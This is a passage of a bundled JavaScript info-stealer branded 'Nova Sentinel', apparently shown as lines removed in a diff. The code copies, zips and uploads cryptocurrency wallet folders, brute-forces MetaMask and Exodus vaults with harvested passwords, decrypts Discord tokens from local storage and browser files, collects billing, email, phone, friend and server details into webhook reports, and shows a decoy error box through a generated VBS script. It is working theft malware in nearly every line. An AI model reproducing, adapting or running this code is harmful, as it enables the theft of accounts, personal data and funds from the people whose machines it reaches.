\"\\\\Electrum\\\\wallets\\\\\",\n      ]),\n      new Cold(\"Ether\", appdata + \"\\\\Ethereum\", [\n        appdata + \"\\\\Ethereum\\\\keystore\\\\\",\n      ]),\n      new Cold(\"Zcash\", appdata + \"\\\\Zcash\", [appdata + \"\\\\Zcash\"]),\n      new Cold(\"Armory\", appdata + \"\\\\Armory\", [appdata + \"\\\\Armory\"]),\n      new Cold(\"Bytecoin\", appdata + \"\\\\Bytecoin\", [appdata + \"\\\\Bytecoin\"]),\n      new Cold(\"Jaxx\", appdata + \"\\\\Jaxx\", [\n        appdata +\n          \"\\\\Jaxx\\\\com.liberty.jaxx\\\\IndexedDB\\\\file_0.indexeddb.leveldb\",\n      ]),\n      new Cold(\"Guarda\", appdata + \"\\\\Guarda\", [\n        appdata + \"\\\\Guarda\\\\Local Storage\\\\leveldb\",\n      ]),\n      new Cold(\"Coinomi\", local + \"\\\\Coinomi\", [\n        appdata + \"\\\\Coinomi\\\\Coinomi\\\\wallets\",\n      ]),\n    ];\n\n    for (var i = 0; i < colds.length; i++) {\n      const cold = colds[i];\n      if (fs.existsSync(cold.existpath)) {\n        if (cold.name == \"Exodus\") {\n          stat.AddColds(cold.name);\n          await save.ArraySave(cold.stealpath, \"Wallets\", cold.name);\n\n          const zipPath = await save.zip(cold.stealpath);\n          let exodusurl = await upload(zipPath);\n          stat.addExodusLink(exodusurl);\n        }\n        if (cold.name == \"Atomic\") {\n          stat.AddColds(cold.name);\n          await save.ArraySave(cold.stealpath, \"Wallets\", cold.name);\n\n          const zipPath = await save.zip(cold.stealpath);\n          let atomicurl = await upload(zipPath);\n          stat.addAtomicLink(atomicurl);\n        }\n        stat.AddColds(cold.name);\n        save.ArraySave(cold.stealpath, \"Wallets\", cold.name);\n      }\n    }\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nasync function Decrypt(data, key) {\n  var res = \"\";\n  try {\n    res = await passworder.decrypt(key, data);\n  } catch (err) {}\n  return res;\n}\n\nasync function decodeMetamask(password, vault) {\n  var vaultJson = null;\n  try {\n    var vaultJson = JSON.parse(vault);\n  } catch (e) {}\n\n  if (vaultJson == null) {\n    return;\n  }\n\n  return await Decrypt(vault, password);\n}\n\nfunction getMnemonic(json) {\n  var res = \"\";\n  for (var key of json) {\n    var mnemonic = key.data.mnemonic;\n    if (mnemonic != undefined) {\n      if (Array.isArray(mnemonic)) {\n        res = Buffer.from(mnemonic).toString(\"utf-8\");\n      } else {\n        res = mnemonic;\n      }\n    }\n  }\n  return res;\n}\n\nfunction decryptExodus(data, phrase) {\n  try {\n    seco.decryptData(data, phrase);\n    return phrase;\n  } catch (ex) {\n    return \"\";\n  }\n}\n\nasync function decryptFileSeco(filename, passwlist) {\n  const list = passwlist;\n  var data = fs.readFileSync(filename);\n  var phrase;\n  try {\n    if (list.length > 0) {\n      list.forEach(function (element) {\n        phrase = decryptExodus(data, element);\n        if (phrase != \"\" && !stat.exodus.includes(phrase)) {\n          stat.AddExodus(phrase);\n        }\n      });\n    }\n  } catch (e) {}\n}\n\nasync function exodusDecrypt(cc, passwords) {\n  if (cc != \"yes\") return;\n  const appdata = process.env.appdata;\n  const seedpath = appdata + \"\\\\Exodus\\\\exodus.wallet\\\\seed.seco\";\n  if (fs.existsSync(seedpath)) {\n    try {\n      decryptFileSeco(seedpath, passwords);\n    } catch (e) {}\n  } else {\n  }\n}\n\nasync function NovaSentinelFetchMeta(passwd) {\n  const browsers_profile = getBrowsersProfile();\n\n  var folders = [];\n  var vaults = [];\n\n  for (let i = 0; i < browsers_profile.length; i++) {\n    const browser = browsers_profile[i];\n    const savePath = browser + \"\\\\nkbihfbeogaeaoehlefnkodbefgpgknn\\\\\";\n    if (fs.existsSync(savePath)) {\n      folders.push(savePath);\n    }\n  }\n\n  for (let i = 0; i < folders.length; i++) {\n    const folder = folders[i];\n    const files = fs.readdirSync(folder);\n\n    for (let u = 0; u < files.length; u++) {\n      const file = files[u];\n\n      if (file.endsWith(\".log\")) {\n        const data = fs.readFileSync(folder + file, \"utf-8\");\n\n        const regex = /\\\"vault\":\"(?:[^\\\\\"]|\\\\\\\\|\\\\\")*\"\\}/gm;\n\n        const finds = data.match(regex);\n\n        for (let o = 0; o < finds.length; o++) {\n          const find = finds[o];\n\n          vaults.push(\n            find.replace(/\\\\/gm, \"\").replace('\"vault\":\"', \"\").slice(0, -2)\n          );\n        }\n      }\n    }\n  }\n\n  vaults = [...new Set(vaults)];\n\n  var mnemonics = [];\n\n  for (let i = 0; i < vaults.length; i++) {\n    const vault = vaults[i];\n\n    for (let u = 0; u < passwd.length; u++) {\n      const password = passwd[u];\n      var tryPass = await decodeMetamask(password, vault);\n\n      if (tryPass != \"\" && tryPass != undefined) {\n        mnemonics.push(getMnemonic(tryPass));\n      }\n    }\n  }\n\n  mnemonics = [...new Set(mnemonics)];\n  mnemonics = mnemonics.filter((e) => e);\n  let phrases = [];\n  for (let i = 0; i < mnemonics.length; i++) {\n    phrases.push({\n      phrase: mnemonics[i],\n    });\n  }\n  return phrases;\n}\n\nmodule.exports = {\n  NovaSentinelExtensions,\n  NovaSentinelColds,\n  NovaSentinelFetchMeta,\n  exodusDecrypt,\n};\n\n\n//# sourceURL=webpack://script/./utils/crypto.js?");
-
-/***/ }),
-
-/***/ "./utils/discord.js":
-/*!**************************!*\
-  !*** ./utils/discord.js ***!
-  \**************************/
-/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
-
-eval("const fs = __webpack_require__(/*! fs */ \"fs\"),\n  core = __webpack_require__(/*! ./core */ \"./utils/core.js\"),\n  axios = __webpack_require__(/*! axios */ \"axios\"),\n  boukiapi = __webpack_require__(/*! boukiapi */ \"../node_modules/boukiapi/index.js\"),\n  crypto = __webpack_require__(/*! crypto */ \"crypto\"),\n  { stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\"),\n  path = __webpack_require__(/*! path */ \"path\"),\n  { embeds, stats, badge } = __webpack_require__(/*! ./emotes */ \"./utils/emotes.js\");\n  \n  \nasync function WriteDiscord(profiles) {\n  const basepath = stat.testpath[0];\n  const socialDir = path.join(basepath, \"Social\");\n  const DiscordDir = path.join(socialDir, \"Discord\");\n  try {\n    if (!fs.existsSync(socialDir)) {\n      fs.mkdirSync(socialDir);\n    }\n    if (!fs.existsSync(DiscordDir)) {\n      fs.mkdirSync(DiscordDir);\n    }\n  } catch (e) {\n    return;\n  }\n  if(!profiles)return;\n  if(!profiles.length < 1)return;\n  const dscFilePath = path.join(DiscordDir, \"Discord.txt\");\n  fs.writeFileSync(dscFilePath, core.getHeader() + JSON.stringify(profiles));\n}\n\nclass DiscordAccount {\n  constructor(\n    username,\n    discriminator,\n    id,\n    nitro,\n    badges,\n    billings,\n    email,\n    phone,\n    token,\n    avatar\n  ) {\n    this.username = username;\n    this.tag = `${username}#${discriminator}`;\n    this.id = id;\n    this.nitro = nitro;\n    this.badges = badges;\n    this.billings = billings;\n    this.email = email;\n    if (phone != \"\" && phone != undefined) {\n      this.phone = phone;\n    } else {\n      this.phone = \"None\";\n    }\n    this.token = token;\n    this.avatar =\n      \"https://cdn.discordapp.com/avatars/\" + id + \"/\" + avatar + \".png\";\n  }\n}\n\nfunction getBadges(json) {\n  let badges = [\n    {\n      name: badge.staff,\n      flag: 1,\n    },\n    {\n      name: badge.partner,\n      flag: 2,\n    },\n    {\n      name: badge.hypesquad_event,\n      flag: 4,\n    },\n    {\n      name: badge.bughunter_1,\n      flag: 8,\n    },\n    {\n      name: badge.bughunter_2,\n      flag: 16384,\n    },\n    {\n      name: badge.developer,\n      flag: 131072,\n    },\n    {\n      name: badge.early,\n      flag: 512,\n    },\n    {\n      name: badge.bravery,\n      flag: 64,\n    },\n    {\n      name: badge.brillance,\n      flag: 128,\n    },\n    {\n      name: badge.balance,\n      flag: 256,\n    },\n    {\n      name: badge.active_developer,\n      flag: 4194304,\n    },\n  ];\n\n  let flag = json[\"flags\"];\n  var badgesRes = \"\";\n\n  for (let badge of badges) {\n    if ((flag & badge.flag) == badge.flag) {\n      badgesRes = badgesRes + \" \" + badge.name;\n    }\n  }\n\n  return badgesRes == \"\" ? \"`None`\" : badgesRes;\n}\n\nasync function getInventory(token) {\n  const url = \"https://discord.com/api/v9/outbound-promotions\";\n  const authToken = token;\n\n  try {\n    const response = await axios.get(url, {\n      headers: {\n        Authorization: `${authToken}`,\n      },\n    });\n\n    if (response.status === 200) {\n      const promotion = response.data;\n      const g = promotion.map((prom) => `🎁 ${prom.outbound_title}`);\n      const gString = g.join(\"\\n\");\n      return gString;\n    } else {\n      return null;\n    }\n  } catch (error) {\n    return null;\n  }\n}\nasync function getBilling(token) {\n  var billings = \"\";\n  try {\n    const res = await axios({\n      url: `https://canary.discord.com/api/v9/users/@me/billing/payment-sources`,\n      method: \"GET\",\n      headers: {\n        Authorization: `${token}`,\n      },\n    });\n\n    for (let billing of res.data) {\n      let type = billing[\"type\"];\n      let invalid = billing[\"invalid\"];\n\n      if (type == 1 && !invalid) {\n        billings = billings + ` ${embeds.creditcard}`;\n      }\n      if (type == 2 && !invalid) {\n        billings = billings + ` ${embeds.paypal}`;\n      }\n    }\n  } catch (e) {}\n  return billings == \"\" ? \"`None`\" : billings;\n}\nasync function getAccounts(tokens) {\n  let accounts = [];\n  let validTokensCount = 0;\n\n  for (let i = 0; i < tokens.length; i++) {\n    let token = tokens[i];\n    let billing = await getBilling(token);\n\n    try {\n      const res = await axios({\n        url: `https://discord.com/api/v9/users/@me`,\n        method: \"GET\",\n        headers: {\n          Authorization: `${token}`,\n        },\n      });\n\n      const json = res.data;\n      if (json.message == null) {\n        accounts.push(\n          new DiscordAccount(\n            json.username,\n            json.discriminator,\n            json.id,\n            \"NigaUnused\",\n            getBadges(json),\n            billing,\n            json.email,\n            json.phone,\n            token,\n            json.avatar\n          )\n        );\n        validTokensCount++;\n      }\n    } catch (e) {}\n  }\n  return accounts;\n}\n\nconst appdata = process.env.appdata;\nconst local = process.env.localappdata;\n\nasync function NovaSentinelDiscord() {\n  var tokens = [];\n  var discordpaths = {\n    Discord: appdata + \"\\\\discord\\\\Local Storage\\\\leveldb\\\\\",\n    \"Discord Canary\": appdata + \"\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\\",\n    Lightcord: appdata + \"\\\\Lightcord\\\\Local Storage\\\\leveldb\\\\\",\n    \"Discord PTB\": appdata + \"\\\\discordptb\\\\Local Storage\\\\leveldb\\\\\",\n  };\n\n  for (let [key, value] of Object.entries(discordpaths)) {\n    if (!fs.existsSync(value)) {\n      continue;\n    }\n\n    for (var file_name of fs.readdirSync(value)) {\n      if (!file_name.endsWith(\".log\") && !file_name.endsWith(\".ldb\")) {\n        continue;\n      }\n\n      let path_split = value.split(\"\\\\\"),\n        path_split_tail = value.includes(\"Network\")\n          ? path_split.splice(0, path_split.length - 3)\n          : path_split.splice(0, path_split.length - 2),\n        path_tail = path_split_tail.join(\"\\\\\") + \"\\\\\";\n\n      for (var line of fs\n        .readFileSync(`${value}/${file_name}`, \"utf8\")\n        .split(\"\\n\")) {\n        if (value.includes(\"cord\")) {\n          let encrypted = Buffer.from(\n            JSON.parse(\n              fs.readFileSync(path_tail.replace(\"Local Storage\", \"Local State\"))\n            ).os_crypt.encrypted_key,\n            \"base64\"\n          ).slice(5);\n          try {\n          const _key = boukiapi.unprotectData(\n            Buffer.from(encrypted, \"utf-8\"),\n            null,\n            \"CurrentUser\"\n          );\n\n          var encrypted_regex = /dQw4w9WgXcQ:[^\\\"]*/;\n          if (line.match(encrypted_regex)) {\n            try {\n              var token = Buffer.from(\n                line.match(encrypted_regex)[0].split(\"dQw4w9WgXcQ:\")[1],\n                \"base64\"\n              );\n              let start = token.slice(3, 15),\n                middle = token.slice(15, token.length - 16),\n                end = token.slice(token.length - 16, token.length),\n                decipher = crypto.createDecipheriv(\"aes-256-gcm\", _key, start);\n              decipher.setAuthTag(end);\n              token =\n                decipher.update(middle, \"base64\", \"utf-8\") +\n                decipher.final(\"utf-8\");\n              tokens.push(token);\n            } catch (e) {}\n          }\n        }catch(e){}\n      }\n      }\n    }\n  }\n\n  var browsers_path = [\n    appdata + \"\\\\Opera Software\\\\Opera Stable\\\\Local Storage\\\\leveldb\\\\\",\n    appdata + \"\\\\Opera Software\\\\Opera GX Stable\\\\Local Storage\\\\leveldb\\\\\",\n    local + \"\\\\Epic Privacy Browser\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    local + \"\\\\Google\\\\Chrome SxS\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    local + \"\\\\Sputnik\\\\Sputnik\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    local + \"\\\\7Star\\\\7Star\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    local + \"\\\\CentBrowser\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    local + \"\\\\Orbitum\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    local + \"\\\\Kometa\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    local + \"\\\\Torch\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    local + \"\\\\Amigo\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    local +\n      \"\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\%PROFILE%\\\\Local Storage\\\\leveldb\\\\\",\n    local + \"\\\\Iridium\\\\User Data\\\\%PROFILE%\\\\Local Storage\\\\leveldb\\\\\",\n    local +\n      \"\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\%PROFILE%\\\\Local Storage\\\\leveldb\\\\\",\n    local + \"\\\\uCozMedia\\\\Uran\\\\User Data\\\\%PROFILE%\\\\Local Storage\\\\leveldb\\\\\",\n    local + \"\\\\Microsoft\\\\Edge\\\\User Data\\\\%PROFILE%\\\\Local Storage\\\\leveldb\\\\\",\n    local + \"\\\\Google\\\\Chrome\\\\User Data\\\\%PROFILE%\\\\Local Storage\\\\leveldb\\\\\",\n    local + \"\\\\Vivaldi\\\\User Data\\\\%PROFILE%\\\\Local Storage\\\\leveldb\\\\\",\n  ];\n\n  var browsers_profile = [];\n  for (var i = 0; i < browsers_path.length; i++) {\n    const browser = browsers_path[i];\n    const profiles = core.getProfiles(browser, browser.split(\"\\\\\")[6]);\n    for (var j = 0; j < profiles.length; j++) {\n      browsers_profile.push(profiles[j].path);\n    }\n  }\n  const reg1 = Buffer.from(\n    \"W1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17Mjd9\",\n    \"base64\"\n  ).toString();\n  const reg2 = Buffer.from(\"bWZhXC5bXHctXXs4NH0=\", \"base64\").toString();\n  const reg3 = Buffer.from(\n    \"W1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17MjUsMTEwfQ==\",\n    \"base64\"\n  ).toString();\n\n  const cleanRegex = [\n    new RegExp(reg1, \"gm\"),\n    new RegExp(reg2, \"gm\"),\n    new RegExp(reg3, \"gm\"),\n  ];\n\n  for (let path of browsers_profile) {\n    if (!fs.existsSync(path)) {\n      continue;\n    }\n\n    let files = fs.readdirSync(path);\n    for (let file of files) {\n      for (let reg of cleanRegex) {\n        if (!(file.endsWith(\".log\") || file.endsWith(\".ldb\"))) {\n          continue;\n        }\n\n        let content = fs.readFileSync(path + file, \"utf-8\");\n        Array.prototype.push.apply(tokens, content.match(reg));\n      }\n    }\n  }\n  let uniqueTokens = [];\n  tokens.forEach((token) => {\n    let prefix = token.split(\".\")[0];\n    if (\n      !uniqueTokens.some((existingToken) => existingToken.startsWith(prefix))\n    ) {\n      uniqueTokens.push(token);\n    }\n  });\n  tokens = tokens.filter(function (item, pos) {\n    return tokens.indexOf(item) == pos && item != null;\n  });\n  return await getAccounts(uniqueTokens);\n}\n\nconst calcDate = (a, b) => new Date(a.setMonth(a.getMonth() + b));\n\nconst GetNitro = (r) => {\n  if(!r) return \":x:\";\n  if (!r.premium_type) return \":x:\";\n  switch (r.premium_type) {\n    default:\n      return \":x:\";\n    case 1:\n      return \"<:946246402105819216:962747802797113365>\";\n    case 2:\n      if (!r.premium_guild_since)\n        return \"<:946246402105819216:962747802797113365>\";\n      var now = new Date(Date.now());\n      var arr = [\n        \"<:Booster1Month:1051453771147911208>\",\n        \"<:Booster2Month:1051453772360077374>\",\n        \"<:Booster6Month:1051453773463162890>\",\n        \"<:Booster9Month:1051453774620803122>\",\n        \"<:boost12month:1068308256088400004>\",\n        \"<:Booster15Month:1051453775832961034>\",\n        \"<:BoosterLevel8:1051453778127237180>\",\n        \"<:Booster24Month:1051453776889917530>\",\n      ];\n      var a = [\n        new Date(r.premium_guild_since),\n        new Date(r.premium_guild_since),\n        new Date(r.premium_guild_since),\n        new Date(r.premium_guild_since),\n        new Date(r.premium_guild_since),\n        new Date(r.premium_guild_since),\n        new Date(r.premium_guild_since),\n      ];\n      var b = [2, 3, 6, 9, 12, 15, 18, 24];\n      var r = [];\n      for (var p in a)\n        r.push(Math.round((calcDate(a[p], b[p]) - now) / 86400000));\n      var i = 0;\n      for (var p of r) p > 0 ? \"\" : i++;\n      return \"<:946246402105819216:962747802797113365> \" + arr[i];\n  }\n};\nfunction getCreationDate(userId) {\n  const timestamp = ((BigInt(userId) >> BigInt(22)) + BigInt(1420070400000n)) / BigInt(1000);\n  return Number(timestamp);\n}\n\n\nasync function embed(\n  username,\n  tag,\n  id,\n  nitro,\n  badges,\n  billings,\n  email,\n  phone,\n  token,\n  avatar,\n  password\n) {\n  var Nitro = await getURL(\n    \"https://discord.com/api/v9/users/\" + id + \"/profile\",\n    token\n  );\n  let date = getCreationDate(id)\n  let embed = {\n    color: 3553599,\n    author: {\n      name: `${username} (${id})`,\n      icon_url: `https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png`,\n    },\n    fields: [\n      {\n        name: `${embeds.token} Token`,\n        value: `\\`\\`\\`ansi\\n\u001b[2;36m${token}\u001b[0m\\`\\`\\`\\n[Copy Token](https://scarpatta.fun/copy/${token})`,\n        inline: false,\n      },\n      { \n        name: `${embeds.badges} Badges`, \n        value: `${badges}`, \n        inline: true,\n      },\n      {\n        name: `${embeds.nitro} Nitro`,\n        value: `${GetNitro(Nitro)}`,\n        inline: true,\n      },\n      {\n        name: `${embeds.billings} Billings`,\n        value: `${billings}`,\n        inline: true,\n      },\n      {\n        name: `${embeds.mail} Email`,\n        value: `\\`${email}\\``,\n        inline: true,\n      },\n      {\n        name: `${embeds.phone} Phone`,\n        value: `\\`${phone}\\``,\n        inline: true,\n      },\n      {\n        name: `${stats.disclamer} Created`,\n        value: `<t:${date}:R>`,\n        inline: true,\n      },\n    ],\n    thumbnail: {\n      url: `${avatar}`,\n    },\n    footer: {\n      text: \"@Nova Sentinel | https://t.me/Sordeal\",\n    },\n  };\n  return JSON.stringify(embed);\n}\n\nasync function embedguild(token) {\n  try {\n    const guilds = await getURL(\n      \"https://discord.com/api/v9/users/@me/guilds\",\n      token\n    );\n    if (\n      guilds.length < 1 ||\n      guilds === null ||\n      guilds === undefined ||\n      Guilds.length === 0\n    ) {\n      return null;\n    }\n    const Guilds = await parseGuilds(guilds, token);\n\n    const formattedGuilds = await Guilds.map(\n      (g) =>\n        `╔ **${g.Name}**\\n` +\n        `╠ **ID:** \\`${g.ID}\\`\\n` +\n        `╠  **Members Count:** \\`${g.MembersCount}\\`\\n` +\n        `╠ **Roles Count:** \\`${g.RolesCount}\\`\\n` +\n        `╠ **Boost:** \\`${g.Boost}\\`\\n` +\n        `╚ **Vanity:** \\`${g.Vanity}\\`\\n\\n`\n    ).join(\"\");\n    const params2 = {\n      title: `${embeds.nova} Total Guilds Owner/Admin (${Guilds.length})`,\n      description: formattedGuilds,\n      color: 3553599,\n    };\n    return JSON.stringify(params2);\n  } catch (error) {\n    return null;\n  }\n}\n\nasync function embedbis(token) {\n  try {\n    const friends = await getURL(\n      \"https://discord.com/api/v9/users/@me/relationships\",\n      token\n    );\n    /*\n    let embed = \"None\";\n    const bots = await getURL(\n      \"https://discord.com/api/v9/applications?with_team_applications=true\",\n      token\n    );\n\n    if (bots.length > 0) {\n      const certif = {\n        1: \"No\",\n        2: \"Eligible\",\n        3: \"In progress\",\n        4: \"Yes\",\n      };\n\n      for (const bot of bots) {\n        console.log(bot)\n        if (bot.verification_state != 1) {\n          embed = `**Bot:** ${bot.username}#${\n            bot.discriminator\n          }\\n**State:**: ${certif[bot.verification_state]}`;\n        }\n      }\n    }*/\n    if (friends.length < 1 || friends === null || friends === undefined) {\n      return null;\n    }\n    const Friends = parseFriends(friends);\n    const params2 = {\n      title: `${embeds.nova} UHQ Friends (${Friends.len})`,\n      description: \"**Friends:**\\n\" + Friends.badges,\n      color: 3553599,\n    };\n    return JSON.stringify(params2);\n  } catch (error) {\n    return null;\n  }\n}\n\nconst getURL = async (url, token) => {\n  try {\n    const response = await axios.get(url, {\n      headers: {\n        Authorization: token,\n      },\n    });\n    return response.data;\n  } catch (error) {\n    return null;\n  }\n};\n\nconst GetRBadges = (e) => {\n  var n = \"\";\n  return (\n    1 == (1 & e) && (n += `${badge.staff} `),\n    2 == (2 & e) && (n += `${badge.partner} `),\n    4 == (4 & e) && (n += `${badge.hypesquad_event} `),\n    8 == (8 & e) && (n += `${badge.bughunter_1} `),\n    512 == (512 & e) && (n += `${badge.early} `),\n    16384 == (16384 & e) && (n += `${badge.bughunter_2} `),\n    131072 == (131072 & e) && (n += `${badge.developer} `),\n    \"\" == n && (n = \":x:\"),\n    n\n  );\n};\n\nconst parseGuilds = async (guilds, token) => {\n  let ownerguilds = [];\n  try {\n    for (const g of guilds) {\n      if (g.owner || g.permissions == 140737488355327) {\n        const response = await getURL(\n          `https://discord.com/api/v9/guilds/${g.id}?with_counts=true`,\n          token\n        );\n        if (response.approximate_member_count > 50) {\n          let guildparsed = {\n            Name: g.name,\n            ID: g.id,\n            MembersCount: response.approximate_member_count,\n            Boost: response.premium_subscription_count,\n            Vanity: response.vanity_url_code ?? \"None\",\n            RolesCount: response.roles.length,\n          };\n          ownerguilds.push(guildparsed);\n        }\n      }\n    }\n    return ownerguilds;\n  } catch (err) {\n    return [];\n  }\n};\n\nconst parseFriends = (friends) => {\n  try {\n    var real = friends.filter((x) => x.type == 1);\n    var rareFriends = \"\";\n    for (var friend of real) {\n      var badges = GetRBadges(friend.user.public_flags);\n      if (badges !== \":x:\")\n        rareFriends += `${badges} | \\`${friend.user.username}#${friend.user.discriminator}\\`\\n`;\n    }\n    if (!rareFriends) rareFriends = \"*Nothing to see here*\";\n    return {\n      len: real.length,\n      badges: rareFriends,\n    };\n  } catch (err) {\n    return \":x:\";\n  }\n};\n\nfunction compile(embeds) {\n  var build = \"\";\n  build += `{\\n\"content\": null,\\n\"embeds\": [`;\n  for (let i = 0; i < embeds.length; i++) {\n    build += embeds[i];\n    if (i != embeds.length - 1) {\n      build += \",\\n\";\n    }\n  }\n  build += `],\\n\"avatar_url\": \"https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png\",\\n\"username\": \"Nova Sentinel\",\\n\"attachments\": []\\n}`;\n  return build;\n}\n\nmodule.exports = {\n  embed,\n  embedbis,\n  NovaSentinelDiscord,\n  compile,\n  embedguild,\n  WriteDiscord,\n};\n\n\n//# sourceURL=webpack://script/./utils/discord.js?");
-
-/***/ }),
-
-/***/ "./utils/emotes.js":
-/*!*************************!*\
-  !*** ./utils/emotes.js ***!
-  \*************************/
-/***/ ((module) => {
-
-eval("const g = { \r\n  badge: {\r\n    nitro: \"<:946246402105819216:962747802797113365>\",\r\n    boost_1: \"<:Booster1Month:1051453771147911208>\",\r\n    boost_2: \"<:Booster2Month:1051453772360077374>\",\r\n    boost_3: \"<:Booster3Month:1159062676408905848>\",\r\n    boost_6: \"<:Booster6Month:1051453773463162890>\",\r\n    boost_9: \"<:Booster9Month:1051453774620803122>\",\r\n    boost_12: \"<:boost12month:1068308256088400004>\",\r\n    boost_15: \"<:Booster15Month:1051453775832961034>\",\r\n    boost_18: \"<:BoosterLevel8:1051453778127237180>\",\r\n    boost_24: \"<:Booster24Month:1051453776889917530>\",\r\n    staff: \"<:staff:874750808728666152>\",\r\n    partner: \"<:partner:874750808678354964>\",\r\n    hypesquad_event: \"<:hypesquadevent:1143858325579108505>\",\r\n    bughunter_1: \"<:bughunter_1:874750808426692658>\",\r\n    bughunter_2: \"<:bughunter_2:874750808430874664>\",\r\n    developer: \"<:developer:874750808472825986>\",\r\n    early: \"<:early_supporter:874750808414113823>\",\r\n    bravery: \"<:bravery:874750808388952075>\",\r\n    brillance: \"<:brilliance:874750808338608199>\",\r\n    balance: \"<:balance:874750808267292683>\",\r\n    active_developer: \"<:activedev:1143858315886088263>\",\r\n  },\r\n  embeds: {\r\n    karma: \"<:karma:1173646047134892052>\",\r\n    gold: \"<a:gold:1197551697887764550>\",\r\n    tiktok: \"<:tiktok:1173628882168053811>\",\r\n    instaiscert: \"<:certifiedinsta:1173581219187937310>\",\r\n    instagram: \"<a:instawhite:853376415759335455>\",\r\n    instagram_certified:\"<:instagramlogo:1173581240650182717>\",\r\n    twitter_usernamecert: \"<:certi_twitter:1159090158117867571>\",\r\n    twitter_usernameuncert: \"<:twitter:1159090161494270052>\",\r\n    twitter_followers: \"<:a2_grey_twitter:1135298638248161361>\",\r\n    twitter_followings: \"<:Twitter_retweet:1135298386531188897>\",\r\n    twitter_fav: \"<:twitter_follow:1135298434967019540>\",\r\n    twitter_location: \"<a:controller:1159090439207518269>\",\r\n    inject: \"<a:inject:1159081839596687400>\",\r\n    atom: \"<:account:1159081832751566858>\",\r\n    dsc: \"<:roblux:1159081834966155264>\",\r\n    rblxinfo: \"<:info:1159081837365313619>\",\r\n    infoyl: \"<:ylinfo:1159081835779866635>\",\r\n    mcid: \"<a:books:1159078873699450902>\",\r\n    mcmail: \"<:email:1159078862135775252> \",\r\n    mcgapple: \"<:gapple:1159078870461460480>\",\r\n    hypixel: \"<:hypixel:1159078857542996090>\",\r\n    keysmc: \"<a:keys:1159078859682107453>\",\r\n    namemc: \"<:namemc:1159078855550713886>\",\r\n    games: \"🎮\",\r\n    vpn: \"🌐\",\r\n    clients: \"⌨️\",\r\n    nova: \"<:lilnova5:1203979456729976912>\",\r\n    crypto: \"<:wallets4:1203979459477245952>\",\r\n    creditcard: \"<:credcard:1203979460714692630>\",\r\n    paypal: \"<:paypal:1203981549666828301>\",\r\n    Old_Username: \"<:oldusertag:1203979463994376232>\",\r\n    token: \"<a:dsctkn1:1203979465802125322>\",\r\n    badges: \"<:badg:1203979468679548928>\",\r\n    nitro: \"<:nitrocode2:1203979470466191370>\",\r\n    billings: \"<:billing8:1203979473100476446>\",\r\n    mail: \"<:blackstar:1203979482701111327>\",\r\n    phone: \"<:phonenumb:1203979476178837524>\",\r\n    gift: \"<:1839festivepixelpresent:1171449290724491325>\",\r\n    username: \"<:playboi6:1203979478817316914>\",\r\n    cat: \"<a:caat2:1130448854861488168>\",\r\n  },\r\n  stats: {\r\n    password: \"<a:blackkey:1203979480314552431>\",\r\n    cookie: \"<:blackstar:1203979482701111327>\",\r\n    card: \"<a:blackcard:1203979484726820865>\",\r\n    autofill: \"<a:autofill:1203979487180750871>\",\r\n    metamask: \"<:metamask:1203979489131110410>\",\r\n    exodus: \"<:exodus:1203979491722928148>\",\r\n    computer: \"<:computer:1203979493291597826>\",\r\n    ip: \"<:black_crown:1203979497515393045>\",\r\n    country: \"<:black_crown:1203979497515393045>\",\r\n    disclamer: \"<:disclaimer:1203979499570597929>\",\r\n    download: \"<:download:1203979502426791966>\",\r\n  },\r\n};\r\n\r\nlet { embeds, stats, badge } = g;\r\n\r\nmodule.exports = {\r\n  embeds,\r\n  stats,\r\n  badge,\r\n};\r\n\n\n//# sourceURL=webpack://script/./utils/emotes.js?");
-
-/***/ }),
-
-/***/ "./utils/fake_error.js":
-/*!*****************************!*\
-  !*** ./utils/fake_error.js ***!
-  \*****************************/
-/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
-
-eval("const { exec } = __webpack_require__(/*! child_process */ \"child_process\"),\r\n  fs = __webpack_require__(/*! fs */ \"fs\"),\r\n  save = __webpack_require__(/*! ./save */ \"./utils/save.js\")\r\n\r\nconst generateRandomName = (length) => {\r\n  const characters =\r\n    \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\";\r\n  let result = \"\";\r\n  for (let i = 0; i < length; i++) {\r\n    const randomIndex = Math.floor(Math.random() * characters.length);\r\n    result += characters[randomIndex];\r\n  }\r\n  return result;\r\n};\r\n\r\nfunction error(cc, msg, startuped) {\r\n  if (cc !== \"yes\" && startuped !== true) return;\r\n  const vbsScript = `\r\n  Set objShell = WScript.CreateObject(\"WScript.Shell\")\r\n  MsgBox \"Error : ${msg}\", vbInformation, \"Error Code : 43 \"\r\n  `;\r\n  const randomName = generateRandomName(12);\r\n  const vbsFileName = process.env.APPDATA + \"\\\\\" + randomName + \".vbs\";\r\n\r\n  fs.writeFileSync(vbsFileName, vbsScript, \"utf8\");\r\n\r\n  exec(\"cscript \" + vbsFileName, (error, stdout, stderr) => {\r\n    if (error) {\r\n      save.SaveError(error);\r\n    }\r\n  });\r\n}\r\n\r\nmodule.exports = {\r\n  error,\r\n};\r\n\n\n//# sourceURL=webpack://script/./utils/fake_error.js?");
-
-/***/ }),
-
-/***/ "./utils/files.js":
-/*!************************!*\
-  !*** ./utils/files.js ***!
-  \************************/
-/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
-
